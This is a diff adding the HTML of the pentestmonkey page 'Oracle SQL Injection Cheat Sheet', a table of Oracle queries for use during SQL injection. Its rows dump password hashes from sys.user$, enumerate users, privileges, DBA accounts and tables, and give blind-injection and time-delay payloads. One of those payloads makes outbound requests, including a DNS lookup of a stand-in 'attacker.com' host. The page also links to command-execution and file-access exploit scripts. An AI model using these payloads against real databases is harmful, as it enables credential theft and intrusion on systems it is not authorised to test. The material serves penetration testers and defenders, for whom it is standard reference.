@@ -1,0 +1,361 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US" xml:lang="en-US">
+<head profile="http://gmpg.org/xfn/11">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+<title>Oracle SQL Injection Cheat Sheet | pentestmonkey</title>
+<link rel="stylesheet" href="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/style.css" type="text/css" media="screen" />
+<link rel="pingback" href="http://pentestmonkey.net/xmlrpc.php" />
+<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Feed" href="http://pentestmonkey.net/feed" />
+<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Comments Feed" href="http://pentestmonkey.net/comments/feed" />
+<link rel="alternate" type="application/rss+xml" title="pentestmonkey &raquo; Oracle SQL Injection Cheat Sheet Comments Feed" href="http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet/feed" />
+<script type='text/javascript' src='http://pentestmonkey.net/wp-includes/js/l10n.js?ver=20101110'></script>
+<script type='text/javascript' src='http://pentestmonkey.net/wp-includes/js/jquery/jquery.js?ver=1.6.1'></script>
+<script type='text/javascript' src='http://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/jquery.ddmenu.js?ver=3.2.1'></script>
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://pentestmonkey.net/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://pentestmonkey.net/wp-includes/wlwmanifest.xml" /> 
+<link rel='index' title='pentestmonkey' href='http://pentestmonkey.net' />
+<link rel='start' title='A Penetration Testing Site' href='http://pentestmonkey.net/site-news/a-penetration-testing-site' />
+<link rel='prev' title='MySQL SQL Injection Cheat Sheet' href='http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet' />
+<link rel='next' title='MSSQL Injection Cheat Sheet' href='http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet' />
+<meta name="generator" content="WordPress 3.2.1" />
+<link rel='canonical' href='http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet' />
+<link rel='shortlink' href='http://pentestmonkey.net/?p=87' />
+<!--[if lte IE 7]><link href="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/ie.css" rel="stylesheet" media="screen" type="text/css" /><![endif]-->	
+<!--[if IE 6]><script src="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/js/DD_belatedPNG.js"></script><![endif]-->
+</head>
+<body class="single single-post postid-87 single-format-standard">
+	<div class="all-page">
+		
+		<div class="container">
+			
+			<!-- HEADER -->
+			<div id="header">
+			    <div class="website-name"><a href="http://pentestmonkey.net/">pentestmonkey</a></div>
+				<div class="slogan">Taking the monkey work out of pentesting</div>
+			</div>
+			<!-- /HEADER -->
+
+			<!-- main NAVIGATION -->
+			<div id="mainNav">
+				<div class="wrap">
+    <div class="menu-cheat-sheets-container"><ul id="menu-cheat-sheets" class="menu"><li id="menu-item-133" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-133"><a href="http://pentestmonkey.net/category/site-news"><span>Site News</span></a></li>
+<li id="menu-item-130" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-130"><a href="http://pentestmonkey.net/category/blog"><span>Blog</span></a></li>
+<li id="menu-item-136" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-136"><a href="http://pentestmonkey.net/category/tools"><span>Tools</span></a></li>
+<li id="menu-item-137" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-137"><a href="http://pentestmonkey.net/category/yaptest"><span>Yaptest</span></a></li>
+<li id="menu-item-134" class="menu-item menu-item-type-taxonomy menu-item-object-category current-post-ancestor menu-item-134"><a href="http://pentestmonkey.net/category/cheat-sheet"><span>Cheat Sheets</span></a></li>
+<li id="menu-item-135" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-135"><a href="http://pentestmonkey.net/category/contact"><span>Contact</span></a></li>
+</ul></div>				</div>
+			</div>
+			<!-- /main NAVIGATION -->
+			<div class="clear"></div>
+
+
+			<!-- CONTENT -->
+			<div id="content">
+
+	<!-- Start: Left Panel -->
+	<div class="content">
+
+	
+		<div class="post-87 post type-post status-publish format-standard hentry category-sql-injection tag-cheatsheet tag-database tag-oracle tag-pentest tag-sqlinjection" id="post-87">
+			<h1>Oracle SQL Injection Cheat Sheet</h1>
+
+			<div class="entryContent">
+				<p>Some useful syntax reminders for SQL Injection into Oracle databases&#8230;<br />
+<span id="more-87"></span></p>
+<p>This post is part of a series of SQL Injection Cheat Sheets.  In this series, I&#8217;ve endevoured to tabulate the data to make it easier to read and to use the same table for for each database backend.  This helps to highlight any features which are lacking for each database, and enumeration techniques that don&#8217;t apply and also areas that I haven&#8217;t got round to researching yet.</p>
+<p>The complete list of SQL Injection Cheat Sheets I&#8217;m working is:</p>
+<ul>
+<li><a href="http://pentestmonkey.net/blog/oracle-sql-injection-cheat-sheet/">Oracle</a></li>
+<li><a href="http://pentestmonkey.net/blog/mssql-sql-injection-cheat-sheet/">MSSQL</a></li>
+<li><a href="http://pentestmonkey.net/blog/mysql-sql-injection-cheat-sheet/">MySQL</a></li>
+<li><a href="http://pentestmonkey.net/blog/postgres-sql-injection-cheat-sheet/">PostgreSQL</a></li>
+<li><a href="http://pentestmonkey.net/blog/ingres-sql-injection-cheat-sheet/">Ingres</a></li>
+<li><a href="http://pentestmonkey.net/blog/db2-sql-injection-cheat-sheet/">DB2</a></li>
+<li><a href="http://pentestmonkey.net/blog/informix-sql-injection-cheat-sheet/">Informix</a></li>
+</ul>
+<p>I&#8217;m not planning to write one for MS Access, but there&#8217;s a great <a href="http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html">MS Access Cheat Sheet here</a>.</p>
+<p>Some of the queries in the table below can only be run by an admin.  These are marked with &#8220;&#8211; priv&#8221; at the end of the query.</p>
+<table border="1">
+<tbody>
+<tr>
+<td>Version</td>
+<td>SELECT banner FROM v$version WHERE banner LIKE &#8216;Oracle%&#8217;;<br />
+SELECT banner FROM v$version WHERE banner LIKE &#8216;TNS%&#8217;;<br />
+SELECT version FROM v$instance;</td>
+</tr>
+<tr>
+<td>Comments</td>
+<td>SELECT 1 FROM dual &#8212; comment<br />
+&#8211; NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name &#8216;dual&#8217; when we&#8217;re not actually selecting from a table.</td>
+</tr>
+<tr>
+<td>Current User</td>
+<td>SELECT user FROM dual</td>
+</tr>
+<tr>
+<td>List Users</td>
+<td>SELECT username FROM all_users ORDER BY username;<br />
+SELECT name FROM sys.user$; &#8212; priv</td>
+</tr>
+<tr>
+<td>List Password Hashes</td>
+<td>SELECT name, password, astatus FROM sys.user$ &#8212; priv, &lt;= 10g.  astatus tells you if acct is locked<br />
+SELECT name,spare4 FROM sys.user$ &#8212; priv, 11g</td>
+</tr>
+<tr>
+<td> Password Cracker</td>
+<td><a href="http://www.red-database-security.com/software/checkpwd.html">checkpwd</a> will crack the DES-based hashes from Oracle 8, 9 and 10.</td>
+</tr>
+<tr>
+<td>List Privileges</td>
+<td>SELECT * FROM session_privs; &#8212; current privs<br />
+SELECT * FROM dba_sys_privs WHERE grantee = &#8216;DBSNMP&#8217;; &#8212; priv, list a user&#8217;s privs<br />
+SELECT grantee FROM dba_sys_privs WHERE privilege = &#8216;SELECT ANY DICTIONARY&#8217;; &#8212; priv, find users with a particular priv<br />
+SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
+</tr>
+<tr>
+<td>List DBA Accounts</td>
+<td>SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = &#8216;YES&#8217;; &#8212; priv, list DBAs, DBA roles</td>
+</tr>
+<tr>
+<td>Current Database</td>
+<td>SELECT global_name FROM global_name;<br />
+SELECT name FROM v$database;<br />
+SELECT instance_name FROM v$instance;<br />
+SELECT SYS.DATABASE_NAME FROM DUAL;</td>
+</tr>
+<tr>
+<td>List Databases</td>
+<td>SELECT DISTINCT owner FROM all_tables; &#8212; list schemas (one per user)<br />
+&#8211; Also query TNS listener for other databases.  See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html">tnscmd</a> (services | status).</td>
+</tr>
+<tr>
+<td>List Columns</td>
+<td>SELECT column_name FROM all_tab_columns WHERE table_name = &#8216;blah&#8217;;<br />
+SELECT column_name FROM all_tab_columns WHERE table_name = &#8216;blah&#8217; and owner = &#8216;foo&#8217;;</td>
+</tr>
+<tr>
+<td>List Tables</td>
+<td>SELECT table_name FROM all_tables;<br />
+SELECT owner, table_name FROM all_tables;</td>
+</tr>
+<tr>
+<td>Find Tables From Column Name</td>
+<td>SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE &#8216;%PASS%&#8217;; &#8212; NB: table names are upper case</td>
+</tr>
+<tr>
+<td>Select Nth Row</td>
+<td>SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; &#8212; gets 9th row (rows numbered from 1)</td>
+</tr>
+<tr>
+<td>Select Nth Char</td>
+<td>SELECT substr(&#8216;abcd&#8217;, 3, 1) FROM dual; &#8212; gets 3rd character, &#8216;c&#8217;</td>
+</tr>
+<tr>
+<td>Bitwise AND</td>
+<td>SELECT bitand(6,2) FROM dual; &#8212; returns 2<br />
+SELECT bitand(6,1) FROM dual; &#8212; returns0</td>
+</tr>
+<tr>
+<td>ASCII Value -&gt; Char</td>
+<td>SELECT chr(65) FROM dual; &#8212; returns A</td>
+</tr>
+<tr>
+<td>Char -&gt; ASCII Value</td>
+<td>SELECT ascii(&#8216;A&#8217;) FROM dual; &#8212; returns 65</td>
+</tr>
+<tr>
+<td>Casting</td>
+<td>SELECT CAST(1 AS char) FROM dual;<br />
+SELECT CAST(&#8217;1&#8242; AS int) FROM dual;</td>
+</tr>
+<tr>
+<td>String Concatenation</td>
+<td>SELECT &#8216;A&#8217; || &#8216;B&#8217; FROM dual; &#8212; returns AB</td>
+</tr>
+<tr>
+<td>If Statement</td>
+<td>BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; &#8212; doesn&#8217;t play well with SELECT statements</td>
+</tr>
+<tr>
+<td>Case Statement</td>
+<td>SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; &#8212; returns 1<br />
+SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; &#8212; returns 2</td>
+</tr>
+<tr>
+<td>Avoiding Quotes</td>
+<td>SELECT chr(65) || chr(66) FROM dual; &#8212; returns AB</td>
+</tr>
+<tr>
+<td>Time Delay</td>
+<td>BEGIN DBMS_LOCK.SLEEP(5); END; &#8212; priv, can&#8217;t seem to embed this in a SELECT<br />
+SELECT UTL_INADDR.get_host_name(&#8217;10.0.0.1&#8242;) FROM dual; &#8212; if reverse looks are slow<br />
+SELECT UTL_INADDR.get_host_address(&#8216;blah.attacker.com&#8217;) FROM dual; &#8212; if forward lookups are slow<br />
+SELECT UTL_HTTP.REQUEST(&#8216;http://google.com&#8217;) FROM dual; &#8212; if outbound TCP is filtered / slow<br />
+&#8211; Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx">Heavy Queries</a> to create a time delay</td>
+</tr>
+<tr>
+<td>Make DNS Requests</td>
+<td>SELECT UTL_INADDR.get_host_address(&#8216;google.com&#8217;) FROM dual;<br />
+SELECT UTL_HTTP.REQUEST(&#8216;http://google.com&#8217;) FROM dual;</td>
+</tr>
+<tr>
+<td>Command Execution</td>
+<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a>can be used to execute commands if it&#8217;s installed.<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql">ExtProc</a> can sometimes be used too, though it normally failed for me. <img src='http://pentestmonkey.net/wp-includes/images/smilies/icon_sad.gif' alt=':-(' class='wp-smiley' /> </td>
+</tr>
+<tr>
+<td>Local File Access</td>
+<td><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">UTL_FILE</a> can sometimes be used.  Check that the following is non-null:<br />
+SELECT value FROM v$parameter2 WHERE name = &#8216;utl_file_dir&#8217;;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql">Java</a> can be used to read and write files if it&#8217;s installed (it is not available in Oracle Express).</td>
+</tr>
+<tr>
+<td>Hostname, IP Address</td>
+<td>SELECT UTL_INADDR.get_host_name FROM dual;<br />
+SELECT host_name FROM v$instance;<br />
+SELECT UTL_INADDR.get_host_address FROM dual; &#8212; gets IP address<br />
+SELECT UTL_INADDR.get_host_name(&#8217;10.0.0.1&#8242;) FROM dual; &#8212; gets hostnames</td>
+</tr>
+<tr>
+<td>Location of DB files</td>
+<td>SELECT name FROM V$DATAFILE;</td>
+</tr>
+<tr>
+<td>Default/System Databases</td>
+<td>SYSTEM<br />
+SYSAUX</td>
+</tr>
+</tbody>
+</table>
+<h3>Misc Tips</h3>
+<p>In no particular order, here are some suggestions from pentestmonkey readers.</p>
+<p>From Christian Mehlmauer:</p>
+<table border="1">
+<tbody>
+<tr>
+<td>Get all tablenames in one string</td>
+<td>select rtrim(xmlagg(xmlelement(e, table_name || &#8216;,&#8217;)).extract(&#8216;//text()&#8217;).extract(&#8216;//text()&#8217;) ,&#8217;,') from all_tables &#8211;  when using union based SQLI with only one row</td>
+</tr>
+<tr>
+<td>Blind SQLI in order by clause</td>
+<td>order by case when ((select 1 from user_tables where substr(lower(table_name), 1, 1) = &#8216;a&#8217; and rownum = 1)=1) then column_name1 else column_name2 end &#8212; you must know 2 column names with the same datatype</td>
+</tr>
+</tbody>
+</table>
+<h3></h3>
+<p>&nbsp;</p>
+                <div class="clear"></div>
+								<p>Tags: <a href="http://pentestmonkey.net/tag/cheatsheet" rel="tag">cheatsheet</a>, <a href="http://pentestmonkey.net/tag/database" rel="tag">database</a>, <a href="http://pentestmonkey.net/tag/oracle" rel="tag">oracle</a>, <a href="http://pentestmonkey.net/tag/pentest" rel="tag">pentest</a>, <a href="http://pentestmonkey.net/tag/sqlinjection" rel="tag">sqlinjection</a></p>				<p>Posted in <a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts in SQL Injection" rel="category tag">SQL Injection</a></p>
+				
+			</div>
+		</div>
+
+	
+<!-- You can start editing here. -->
+
+
+			<!-- If comments are open, but there are no comments. -->
+
+	 
+<p></p>
+<br />
+
+
+								
+
+
+
+
+	
+	</div>
+				<!-- sidebar -->
+				<div class="sideBar">
+					
+					<div class="nav">
+						<div class="bFrameT"><i></i></div>
+	<form method="get" id="searchform" action="http://pentestmonkey.net/" class="searchForm">
+	<p><input type="text" value="" name="s" id="s" class="field" />
+	<input type="image" src="http://pentestmonkey.net/wp-content/themes/baza-noclegowa/images/search.gif" alt="" title="Search" id="searchsubmit" class="btn" /></p>
+</form>
+<h3><span>Categories</span></h3>		<ul>
+	<li class="cat-item cat-item-5"><a href="http://pentestmonkey.net/category/blog" title="View all posts filed under Blog">Blog</a> (78)
+</li>
+	<li class="cat-item cat-item-39"><a href="http://pentestmonkey.net/category/cheat-sheet" title="View all posts filed under Cheat Sheets">Cheat Sheets</a> (10)
+<ul class='children'>
+	<li class="cat-item cat-item-40"><a href="http://pentestmonkey.net/category/cheat-sheet/shells" title="View all posts filed under Shells">Shells</a> (1)
+</li>
+	<li class="cat-item cat-item-8"><a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" title="View all posts filed under SQL Injection">SQL Injection</a> (7)
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://pentestmonkey.net/category/contact" title="View all posts filed under Contact">Contact</a> (2)
+</li>
+	<li class="cat-item cat-item-3"><a href="http://pentestmonkey.net/category/site-news" title="View all posts filed under Site News">Site News</a> (3)
+</li>
+	<li class="cat-item cat-item-4"><a href="http://pentestmonkey.net/category/tools" title="View all posts filed under Tools">Tools</a> (17)
+<ul class='children'>
+	<li class="cat-item cat-item-14"><a href="http://pentestmonkey.net/category/tools/audit" title="View all posts filed under Audit">Audit</a> (3)
+</li>
+	<li class="cat-item cat-item-16"><a href="http://pentestmonkey.net/category/tools/misc" title="View all posts filed under Misc">Misc</a> (7)
+</li>
+	<li class="cat-item cat-item-13"><a href="http://pentestmonkey.net/category/tools/user-enumeration" title="View all posts filed under User Enumeration">User Enumeration</a> (4)
+</li>
+	<li class="cat-item cat-item-15"><a href="http://pentestmonkey.net/category/tools/web-shells" title="View all posts filed under Web Shells">Web Shells</a> (3)
+</li>
+</ul>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://pentestmonkey.net/category/uncategorized" title="View all posts filed under Uncategorized">Uncategorized</a> (3)
+</li>
+	<li class="cat-item cat-item-6"><a href="http://pentestmonkey.net/category/yaptest" title="View all posts filed under Yaptest">Yaptest</a> (15)
+<ul class='children'>
+	<li class="cat-item cat-item-12"><a href="http://pentestmonkey.net/category/yaptest/front-end" title="View all posts filed under Front End">Front End</a> (1)
+</li>
+	<li class="cat-item cat-item-9"><a href="http://pentestmonkey.net/category/yaptest/installing" title="View all posts filed under Installing">Installing</a> (2)
+</li>
+	<li class="cat-item cat-item-11"><a href="http://pentestmonkey.net/category/yaptest/overview" title="View all posts filed under Overview">Overview</a> (2)
+</li>
+	<li class="cat-item cat-item-10"><a href="http://pentestmonkey.net/category/yaptest/using" title="View all posts filed under Using">Using</a> (8)
+</li>
+</ul>
+</li>
+		</ul>
+<h3><span> <a href="/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml"><img src="http://www.feedburner.com/fb/images/pub/feed-icon16x16.png" alt="" style="vertical-align:middle;border:0"/></a>&nbsp;<a href="/rss/" class="mainlevel-nav" rel="alternate" type="application/rss+xml">RSS Feed</a></p> <link rel="alternate" type="application/rss+xml" title="Pentestmonkey RSS Feed" href="/rss/" /> </span></h3>
+			
+						<div class="bFrameB"><i></i></div>
+					</div>
+					
+				</div>
+				<!-- /sidebar -->
+	
+				</div>
+				<!-- /content -->
+				
+			</div>
+			<!-- /CONTENT -->	
+			
+		
+		<!-- bottom NAVIGATION -->
+		<div id="bottomNav">
+		</div>
+		<!-- /bottom NAVIGATION -->
+		
+		<!-- FOOTER -->
+		<div id="footer">
+         <div class="menu"></div>
+			
+			
+		</div>
+		<!-- /FOOTER -->
+	</div>
+		
+
+
+<script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-2082472-1";
+urchinTracker();
+</script>
+
+</body>
+</html>
